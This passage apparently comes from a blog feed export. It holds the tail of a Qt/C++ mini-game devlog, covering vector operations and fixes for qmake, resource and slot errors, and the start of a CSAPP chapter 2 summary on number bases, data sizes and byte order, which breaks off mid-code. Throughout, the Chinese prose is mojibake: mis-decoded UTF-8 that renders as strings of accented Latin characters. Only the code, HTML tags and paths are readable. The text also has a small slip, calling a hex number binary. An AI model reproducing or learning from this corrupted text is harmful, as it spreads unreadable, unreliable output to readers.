Widgetï¼Œä¼šè‡ªåŠ¨åˆ†é¡µåˆ†ä¸ºä¸¤ä¸ªçª—å£ã€‚</p><p>åˆæ­¥è®¡åˆ’å°†ç¬¬ä¸€ä¸ªçª—å£ä½œä¸ºhomeé¡µé¢å³æ¸¸æˆä¸»é¡µé¢ï¼Œç¬¬äºŒä¸ªçª—å£ä½œä¸ºå•†åº—é¡µé¢</p><p>æ‰€æœ‰åŸºç¡€çš„æ¸¸æˆèƒŒæ™¯éƒ½æ˜¯ä½¿ç”¨ photoshop åˆ¶ä½œå®Œæˆã€‚</p><p>è®¾ç½®æŒ‰é’®ååˆ©ç”¨å›¾å½¢ç•Œé¢è®¾ç½®è·³è½¬</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_13-37-42.png"></p><p>é€‰æ‹©releasedæ˜¯ç‚¹å‡»æ¾å¼€åè·³è½¬ã€‚</p><p>åœ¨.cppæ–‡ä»¶å†…è®¾ç½®å“åº”ä»£ç ä½¿æŒ‡é’ˆæŒ‡å‘è·³è½¬é¡µé¢</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-29_13-50-21.png"></p><p>é¡µé¢åˆ©ç”¨ ps ç›´æ¥åˆ¶ä½œç›¸åº”éåŠŸèƒ½æŒ‰é’®éƒ¨åˆ†å‡å°‘å·¥ä½œé‡</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/%E8%B5%84%E6%BA%90.png"></p><h3 id="7-é‡åˆ°çš„é—®é¢˜"><a href="#7-é‡åˆ°çš„é—®é¢˜" class="headerlink" title="7.é‡åˆ°çš„é—®é¢˜"></a>7.é‡åˆ°çš„é—®é¢˜</h3><h4 id="7-1-C-ä»£ç "><a href="#7-1-C-ä»£ç " class="headerlink" title="7.1 C++ä»£ç "></a>7.1 C++ä»£ç </h4><h5 id="7-1-1-é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç "><a href="#7-1-1-é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç " class="headerlink" title="7.1.1 é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç "></a>7.1.1 é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç </h5><p>run codeæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯é»‘æ¡†æ˜¯ä¹±ç ï¼Œæ®è¯´äºŒè€…ä¸å¯å…¼å¾—ï¼Œå°±è¿™æ ·å§</p><p>å“ˆå“ˆæ²¡æœ‰è§£å†³æ–¹æ¡ˆğŸ¤ª</p><h5 id="7-1-2-å•†åº—çš„å®ç°"><a href="#7-1-2-å•†åº—çš„å®ç°" class="headerlink" title="7.1.2 å•†åº—çš„å®ç°"></a>7.1.2 å•†åº—çš„å®ç°</h5><blockquote><p>æœ€åå‘ç°æˆ‘å¯ä»¥ä¸ç”¨å•†åº—è¿™ä¸ªç±»ï¼Œå› ä¸ºåœ¨æ¸¸æˆä¸­çš„å•†åº—æ•°æ®æ˜¯é™æ€çš„ä¸ä¼šå¢åŠ æˆ–å‡å°‘ï¼Œç›´æ¥åœ¨mainå‡½æ•°ä¸­è®¾ç½®å³å¯ï¼Œå¯ä»¥å‡å°‘ä»£ç å†—ä½™é‡ã€‚</p></blockquote><p>å‰æƒ…æè¦ï¼š</p><p>å¦‚æœç›´æ¥è®¾ç½®å•†åº—ç±»ï¼Œæ— æ³•å®ç°å•†åº—ä¸­æœ‰å¤šç§å¯é€‰æ‹©çš„å•†å“ã€‚æ‰€ä»¥è®¾æƒ³æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªå•†å“ç±»ï¼Œå•†å“ç±»ä¸­å­˜å‚¨å•†å“çš„åç§°å’Œä»·æ ¼æ•°æ®ã€‚å†è®¾ç½®å•†åº—ç±»ï¼Œåœ¨å•†åº—ç±»ä¸­å­˜å‚¨å•†å“çš„æ•°ç»„ï¼Œå¹¶å®šä¹‰è´­ç‰©çš„å‡½æ•°ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•å®ç°åœ¨å•†åº—ä¸­å­˜å‚¨å•†å“æ•°ç»„å‘¢ï¼Ÿ</p><p><code>vector&lt;Product&gt; products;</code>è¿™å¥ä»£ç å£°æ˜äº†ä¸€ä¸ªåä¸º<code>products</code>çš„å˜é‡ï¼Œç±»å‹ä¸º<code>vector&lt;Product&gt;</code>ã€‚<code>vector</code>æ˜¯C++æ ‡å‡†åº“ä¸­çš„å®¹å™¨ç±»ä¹‹ä¸€ï¼Œç”¨äºå­˜å‚¨å¤šä¸ªå…ƒç´ çš„åŠ¨æ€æ•°ç»„ã€‚</p><p>éœ€è¦é…åˆå¤´æ–‡ä»¶<code>#include&lt;vector&gt;</code>ä½¿ç”¨ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæœ‰ä»¥ä¸‹å‡ ç§å›ºå®šçš„å‡½æ•°ä½¿ç”¨è§„å®šï¼š</p><p>å¯¹äº <code>vector</code> å®¹å™¨ï¼Œå¯ä»¥å¯¹æ•°ç»„è¿›è¡ŒåŠ¨æ€è°ƒæ•´ã€æ·»åŠ ã€åˆ é™¤å’ŒæŸ¥æ‰¾å…ƒç´ ç­‰æ“ä½œï¼š</p><ol><li><p>æ·»åŠ å…ƒç´ ï¼šä½¿ç”¨ <code>push_back()</code> å‡½æ•°å°†æ–°å…ƒç´ æ·»åŠ åˆ°æ•°ç»„çš„æœ«å°¾ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">push_back</span>(product);  <span class="hljs-comment">// å‘æ•°ç»„æœ«å°¾æ·»åŠ ä¸€ä¸ªæ–°å…ƒç´ </span><br></code></pre></td></tr></table></figure></li><li><p>åˆ é™¤å…ƒç´ ï¼šä½¿ç”¨ <code>erase()</code> å‡½æ•°åˆ é™¤æŒ‡å®šä½ç½®æˆ–æŒ‡å®šå…ƒç´ ã€‚</p><ul><li><p>åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(products.<span class="hljs-built_in">begin</span>() + index);  <span class="hljs-comment">// åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ ï¼Œindex ä¸ºå…ƒç´ çš„ç´¢å¼•</span><br></code></pre></td></tr></table></figure></li><li><p>åˆ é™¤æŒ‡å®šå…ƒç´ çš„æ‰€æœ‰åŒ¹é…é¡¹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(std::<span class="hljs-built_in">remove</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product), products.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// åˆ é™¤æŒ‡å®šå…ƒç´ çš„æ‰€æœ‰åŒ¹é…é¡¹</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>æŸ¥æ‰¾å…ƒç´ ï¼šå¯ä»¥ä½¿ç”¨ <code>find()</code> å‡½æ•°æˆ–éå†æ•°ç»„æ¥æŸ¥æ‰¾æŒ‡å®šå…ƒç´ ã€‚</p><ul><li><p>ä½¿ç”¨ <code>find()</code> å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product);  <span class="hljs-comment">// åœ¨æ•°ç»„ä¸­æŸ¥æ‰¾æŒ‡å®šå…ƒç´ ï¼Œproduct ä¸ºè¦æŸ¥æ‰¾çš„å…ƒç´ </span><br><span class="hljs-keyword">if</span> (it != products.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-comment">// å…ƒç´ æ‰¾åˆ°</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// å…ƒç´ æœªæ‰¾åˆ°</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>éå†æ•°ç»„ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : products) &#123;<br>    <span class="hljs-comment">// å¯¹æ¯ä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œitem ä¸ºå½“å‰éå†åˆ°çš„å…ƒç´ </span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="7-2-QTæŠ¥é”™"><a href="#7-2-QTæŠ¥é”™" class="headerlink" title="7.2 QTæŠ¥é”™"></a>7.2 QTæŠ¥é”™</h4><h5 id="7-2-1-qmakeé—®é¢˜"><a href="#7-2-1-qmakeé—®é¢˜" class="headerlink" title="7.2.1 qmakeé—®é¢˜"></a>7.2.1 qmakeé—®é¢˜</h5><p>Error while building&#x2F;deploying project ShortTerm (kit: Desktop Qt 5.12.3 MinGW 64-bit)</p><p>When executing step â€œqmakeâ€</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-14-50.png"></p><p>é—®é¢˜åŸå› å°±æ˜¯æ„å»ºç›®å½•ä¸èƒ½æ”¾ç½®åœ¨ä¸­æ–‡ç›®å½•ä¸‹ï¼Œéœ€è¦åœ¨è‹±æ–‡ç›®å½•é‡Œå»ºç«‹æ–‡ä»¶ã€‚</p><h5 id="7-2-2-å›¾ç‰‡è½½å…¥æŠ¥é”™"><a href="#7-2-2-å›¾ç‰‡è½½å…¥æŠ¥é”™" class="headerlink" title="7.2.2 å›¾ç‰‡è½½å…¥æŠ¥é”™"></a>7.2.2 å›¾ç‰‡è½½å…¥æŠ¥é”™</h5><p>error: No rule to make target â€˜img&#x2F;???-1.pngâ€™, needed by â€˜debug&#x2F;qrc_img.cppâ€™.  Stop.</p><p>å‘ç”Ÿåœ¨æ·»åŠ å®Œèµ„æºååœ¨QTç•Œé¢ä¸ºå›¾ç‰‡é‡å‘½åçš„æƒ…å†µã€‚</p><p>æ‰¾åˆ°æ–‡ä»¶å¤¹ä¸­çš„<code>.qmake.stash</code>ï¼Œå°†å…¶åˆ é™¤é‡æ–°æ„å»ºä¸€æ¬¡ç¨‹åºå³å¯ã€‚ </p><h5 id="7-2-3-è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º"><a href="#7-2-3-è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º" class="headerlink" title="7.2.3 è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º"></a>7.2.3 è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º</h5><p>åœ¨æ·»åŠ å®Œèµ„æºæ–‡ä»¶ä»¥åï¼Œè¦å…ˆ<code>èœå•æ -&gt;æ„å»º-&gt;qmakeä¸€ä¸‹</code>ï¼Œå¦åˆ™æ˜¯æ— æ³•æ˜¾ç¤ºçš„ã€‚</p><h5 id="7-2-4-å¡æ­»"><a href="#7-2-4-å¡æ­»" class="headerlink" title="7.2.4 å¡æ­»"></a>7.2.4 å¡æ­»</h5><p>æ–°å»ºä¸€é¡µpageåè®¾ç½®æ ·å¼è¡¨ä¼šå¡æ­»ï¼Œæ²¡æœ‰æ­£é¢è§£å†³æ–¹æ³•ï¼Œç­‰ä¸€ä¼šå†å¼„æˆ–è€…ç”¨Qt Designerå•ç‹¬é…ç½®uiã€‚</p><p>å—·ï¼Œè¿˜å¯ä»¥ç›´æ¥ç”¨ä»£ç è®¾ç½®æ ·å¼è¡¨ï¼Œä¸è¦ç”¨é€‰é¡¹å°±ä¸ä¼šå¡ã€‚</p><p><del>åˆ«ç®¡äº†æˆ‘ç²¾ç¥å¤±å¸¸äº†</del></p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_15-14-34.png"></p><h5 id="7-2-5-æ§½ä¿¡å·"><a href="#7-2-5-æ§½ä¿¡å·" class="headerlink" title="7.2.5 æ§½ä¿¡å·"></a>7.2.5 æ§½ä¿¡å·</h5><p>D:\software\QT\qt_project\PuppiesMakeAHome\debug\moc_shijx_widget.cpp:236: error: undefined reference to &#96;ShiJX_Widget::on_pushButton_gotostore_2_released()â€™</p><p>æŠ¥é”™æ˜¯å› ä¸ºé”™è¯¯åœ°å»ºç«‹äº†ä¸€ä¸ªæ§½ä¿¡å·ï¼Œä½†æ˜¯ä¸æƒ³è¦äº†ã€‚</p><p>å°±åªåœ¨.cppæ–‡ä»¶ä¸­åˆ é™¤äº†å¯¹åº”çš„å‡½æ•°ã€‚</p><p>è§£å†³æ–¹æ³•æ˜¯åœ¨.hå¤´æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”çš„å£°æ˜åˆ é™¤ï¼Œå¹¶å°†.cppæ–‡ä»¶ä¸­çš„å‡½æ•°åˆ é™¤ï¼Œæœ€åé‡æ„é¡¹ç›®ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬äºŒç«  ä¿¡æ¯å­˜å‚¨ æ€»ç»“</title>
    <link href="/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>è®¡ç®—æœºå¦‚ä½•å­˜å‚¨æ•°æ®</p><span id="more"></span><h2 id="æ•°å­—è¡¨ç¤º"><a href="#æ•°å­—è¡¨ç¤º" class="headerlink" title="æ•°å­—è¡¨ç¤º"></a>æ•°å­—è¡¨ç¤º</h2><h4 id="äºŒè¿›åˆ¶"><a href="#äºŒè¿›åˆ¶" class="headerlink" title="äºŒè¿›åˆ¶"></a>äºŒè¿›åˆ¶</h4><p>äºŒè¿›åˆ¶çš„è‹±æ–‡ç®€å†™ä¸º bin ï¼Œç”¨æ•°å­— 1 å’Œ0 è¡¨ç¤ºã€‚</p><p>ç°ä»£è®¡ç®—æœºå­˜å‚¨å’Œå¤„ç†ä¿¡æ¯éƒ½ç”¨<strong>äºŒè¿›åˆ¶</strong>è¡¨ç¤ºï¼Œå…¶åŸå› æ˜¯äºŒå€¼ä¿¡å·èƒ½å¤Ÿå¾ˆå®¹æ˜“åœ°è¢«è¡¨ç¤ºã€å­˜å‚¨å’Œä¼ è¾“ã€‚</p><p>å¯¹äºäººç±»ï¼Œåè¿›åˆ¶åˆšå¥½å¯¹åº”åä¸ªæ‰‹æŒ‡ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨åè¿›åˆ¶è¡¨ç¤ºï¼›è€Œå¯¹äºè®¡ç®—æœºï¼Œå°±åƒæŸä¸€æŒ‡ç¤ºç¯æ˜¯å¦äº®èµ·ã€å¯¼çº¿æ˜¯å¦è¿é€šè¿™æ ·çš„è¡¨ç¤ºï¼Œå°±åªæœ‰ â€œæ˜¯â€ æˆ– â€œå¦â€ ä¸¤ç§å¯èƒ½ï¼Œæ­£å¯¹åº”äºŒè¿›åˆ¶0å’Œ1ï¼Œæ‰€ä»¥åœ¨æœºç®—æœºä¸­äºŒè¿›åˆ¶å€¼å·¥ä½œå¾—æ›´å¥½ã€‚</p><h4 id="åå…­è¿›åˆ¶"><a href="#åå…­è¿›åˆ¶" class="headerlink" title="åå…­è¿›åˆ¶"></a>åå…­è¿›åˆ¶</h4><p>åå…­è¿›åˆ¶çš„è‹±æ–‡ç®€å†™ä¸º hex ï¼Œä½¿ç”¨æ•°å­— 0 ~ 9 å’Œå­—æ¯ A ~ F æ¥è¡¨ç¤ºã€‚</p><p>åœ¨ C è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨ <code>0x</code> æ¥ä½œä¸ºè¾¨åˆ«åå…­è¿›åˆ¶æ•°å­—çš„æ ‡å¿—ã€‚Cè¯­è¨€ä¸­çš„åå…­è¿›åˆ¶æ•°å­—<strong>å¤§å°å†™ç­‰æ•ˆ</strong>ï¼Œæ¯”å¦‚äºŒè¿›åˆ¶æ•°å­— FA1D37B æˆ‘ä»¬å¯ä»¥è¡¨ç¤ºä¸º 0xfa1d37b ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸º 0XFA1D37B ç”šè‡³å¤§å°å†™æ··åˆ 0xFa1D37bã€‚</p><h4 id="ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢"><a href="#ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢"></a>ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢</h4><p>æˆ‘ä»¬äºŒè¿›åˆ¶ã€åå…­è¿›åˆ¶ä¸åè¿›åˆ¶è½¬æ¢æ–¹æ³•å°±æ˜¯æƒå€¼ç›¸åŠ æˆ–è€…æ˜¯é™¤åŸºå€¼å–ä½™ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">10 = ( 2^0 *0 + 2^1 *1 + 2^2 *0 + 2^3 *1 ) -&gt; 1010 <br>100 = 16^1 *6 + 16^0 *4 -&gt; 0x64<br></code></pre></td></tr></table></figure><p>å¯¹äºäºŒè¿›åˆ¶å’Œåå…­è¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æ¯ä¸€ä½åå…­è¿›åˆ¶æ•°è§†ä½œå››ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œå°†æ¯ä¸€ä½åˆ†åˆ«è½¬æ¢å†ç»„åˆå‡ºç»“æœï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">0x3c81e -&gt; 3 + c + 8 + 1 + e -&gt; 0011 1100 1000 0001 1110<br></code></pre></td></tr></table></figure><h2 id="ä¿¡æ¯å­˜å‚¨"><a href="#ä¿¡æ¯å­˜å‚¨" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h2><h3 id="å­—èŠ‚"><a href="#å­—èŠ‚" class="headerlink" title="å­—èŠ‚"></a>å­—èŠ‚</h3><p>å­—èŠ‚æ˜¯è®¡ç®—æœºå¯å¯»å€çš„æœ€å°å•ä½ï¼Œä¸€ä¸ªå­—èŠ‚ç”± 8 ä½äºŒè¿›åˆ¶ä½ç»„æˆã€‚</p><blockquote><p>è®¡ç®—æœºåªä¼šå»è®¿é—®å­—èŠ‚ 8 ä½æ•´ä½“ï¼Œè€Œä¸ä¼šå»è®¿é—®å†…å­˜ä¸­æŸä¸ªå•ç‹¬çš„ä½ã€‚</p></blockquote><p>ä½†æ˜¯å› ä¸ºäºŒè¿›åˆ¶çš„è¡¨ç¤ºè¿‡äºå†—é•¿ï¼Œæˆ‘ä»¬åœ¨å®é™…çš„è¡¨ç¤ºä¸­å¹¶ä¸æ˜¯ä½¿ç”¨äºŒè¿›åˆ¶æ¥æè¿°ä½æ¨¡å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šä½¿ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºä½æ¨¡å¼ã€‚å…«ä½çš„äºŒè¿›åˆ¶å°±å¯¹åº”ä¸¤ä½16è¿›åˆ¶çš„æ•°ã€‚</p><h3 id="å­—æ•°æ®å¤§å°"><a href="#å­—æ•°æ®å¤§å°" class="headerlink" title="å­—æ•°æ®å¤§å°"></a>å­—æ•°æ®å¤§å°</h3><p>æ¯å°è®¡ç®—æœºéƒ½æœ‰ä¸€ä¸ªå­—é•¿ï¼Œè¡¨æ˜æŒ‡é’ˆæ•°æ®çš„æ ‡ç§°å¤§å°ï¼ŒåŒæ—¶å­—é•¿ä¹Ÿæ˜¯è®¡ç®—æœº <code>CPU</code> ä¸€æ¬¡èƒ½å¤„ç†çš„æœ€å¤§æ•°æ®ã€‚</p><p>ç”±å­—é•¿å†³å®šçš„çš„ç³»ç»Ÿå‚æ•°æ˜¯è™šæ‹Ÿåœ°å€ç©ºé—´çš„æœ€å¤§å¤§å°ã€‚ä¹Ÿå°±æ˜¯è¯´å¯¹äºä¸€ä¸ªå­—é•¿ä¸º x ä½çš„æœºå™¨æ¥è¯´ï¼Œè™šæ‹Ÿåœ°å€çš„èŒƒå›´å°±æ˜¯ 0 ~ 2^x-1ã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬å°±çŸ¥é“ä¸ºä»€ä¹ˆ 32 ä½çš„è®¡ç®—æœºçš„å†…å­˜ä¸º 4GB ä¹Ÿå°±æ˜¯ 2^32 å­—èŠ‚äº†ã€‚</p><p>å¤§å¤šæ•° 64 ä½çš„æœºå™¨éƒ½å¯ä»¥è¿è¡Œ 32 ä½æœºå™¨ç¼–è¯‘çš„ç¨‹åºï¼Œæˆ‘ä»¬å¸¸è¯´çš„ 32 ä½ç¨‹åºå’Œ 64 ä½ç¨‹åºçš„åŒºåˆ«åœ¨äºç¼–è¯‘çš„æ–¹å¼è€Œä¸æ˜¯è¿è¡Œçš„æœºå™¨ç±»å‹ã€‚</p><p>è®¡ç®—æœºçš„ä¸åŒæ•°æ®æ‰€å å­—èŠ‚çš„å¤§å°ä¹Ÿä¸åŒï¼Œå…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>Cå£°æ˜</th><th>32ä½æœºå™¨</th><th>64ä½æœºå™¨</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>8</td></tr><tr><td>int32_t</td><td>4</td><td>4</td></tr><tr><td>int64_t</td><td>8</td><td>8</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><blockquote><p>Cè¯­è¨€ä¸­å¯ä»¥ç”¨ sizeof( ) æ¥è¿”å›æŸç§ç±»å‹æ•°æ®çš„å­—èŠ‚æ•°</p></blockquote><p>ç”±ä¸Šè¡¨å¯çŸ¥ï¼Œåªæœ‰æŒ‡é’ˆç±»å‹çš„æ•°æ®ä¼šéšç€æœºå™¨å­—é•¿å‘ç”Ÿå˜åŒ–ã€‚å°±æ˜¯å‰é¢è¯´çš„ï¼Œæœºå™¨å­—é•¿å†³å®šäº†æŒ‡é’ˆå¤§å°ã€‚</p><h3 id="å¯»å€å’Œå­—èŠ‚é¡ºåº"><a href="#å¯»å€å’Œå­—èŠ‚é¡ºåº" class="headerlink" title="å¯»å€å’Œå­—èŠ‚é¡ºåº"></a>å¯»å€å’Œå­—èŠ‚é¡ºåº</h3><p>è·¨è¶Šå¤šå­—èŠ‚çš„ç¨‹åºå¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤ä¸¤ä¸ªè§„åˆ™ï¼š<strong>å¯¹è±¡åœ°å€å’Œå­—èŠ‚çš„æ’åˆ—æ–¹æ³•</strong>ã€‚</p><p>å¯¹äºåœ°å€ï¼Œåœ¨å‡ ä¹æ‰€æœ‰çš„æœºå™¨ä¸Šï¼Œæ‰€å­—èŠ‚å¯¹è±¡éƒ½è¢«å­˜å‚¨ä¸ºè¿ç»­çš„å­—èŠ‚åºåˆ—ï¼Œå¯¹è±¡çš„åœ°å€å°±æ˜¯<strong>æ‰€ä½¿ç”¨çš„å­—èŠ‚ä¸­æœ€å°çš„åœ°å€</strong>ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå››å­—èŠ‚çš„ int æ•´æ•°è¢«å‚¨å­˜åœ¨ 0x100ã€0x101ã€0x102ã€x103 çš„ä½ç½®ï¼Œé‚£ä¹ˆå®ƒçš„åœ°å€å°±æ˜¯ 0x100ã€‚</p><p>å­—èŠ‚çš„æ’åˆ—è¡¨ç¤ºæ–¹æ³•æœ‰ä¸¤ä¸ªè§„åˆ™ï¼Œåˆ†åˆ«ä¸º<strong>å¤§ç«¯åº</strong>å’Œ<strong>å°ç«¯åº</strong>ã€‚</p><p>ä»¥æ•°æ® 0x12345678 ä¸ºä¾‹ï¼Œä»–çš„æœ€é«˜æœ‰æ•ˆä½æ˜¯ 12 ï¼Œæœ€ä½æœ‰æ•ˆä½æ˜¯ 78ã€‚å¤§ç«¯åºçš„æ’åˆ—æ–¹å¼æ˜¯æœ€é«˜æœ‰æ•ˆä½æ’åˆ—åœ¨æœ€å‰é¢ï¼Œå°ç«¯åºçš„æ’åˆ—æ–¹å¼æ˜¯æœ€ä½æœ‰æ•ˆä½æ’åˆ—åœ¨æœ€å‰é¢ã€‚å…·ä½“çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F.png"></p><p>ç”±ä¸Šå›¾æ¥çœ‹ï¼Œå¤§ç«¯åºæ›´ç¬¦åˆäººç±»å¹³æ—¶çš„é˜…è¯»ä¹ æƒ¯ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¤§å¤šæ•°çš„ Intel å…¼å®¹æœºå™¨ä½¿ç”¨çš„éƒ½æ˜¯å°ç«¯æ¨¡å¼ã€‚æˆ‘ä»¬åœ¨ç¼–å†™æ±‡ç¼–è¯­è¨€æ—¶ï¼Œä¹Ÿéœ€è¦æŒ‰ç…§å°ç«¯åºçš„æ–¹å¼ä¹¦å†™ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‡½æ•°æ¥è¾“å‡ºä¸åŒç¨‹åºå¯¹è±¡çš„å­—èŠ‚è¡¨ç¤ºï¼Œå…¶ä¸­ <em>start</em> ä¸ºè¯¥å¯¹è±¡çš„èµ·å§‹åœ°å€ï¼Œ<em>len</em> ä¸ºæ˜¾ç¤ºçš„å­—èŠ‚æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ä¸‹é¢çš„ä¾‹å­æ¥è§‚å¯Ÿæ•´å½¢å’Œæµ®ç‚¹å‹æ•°æ®çš„å…³ç³»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title 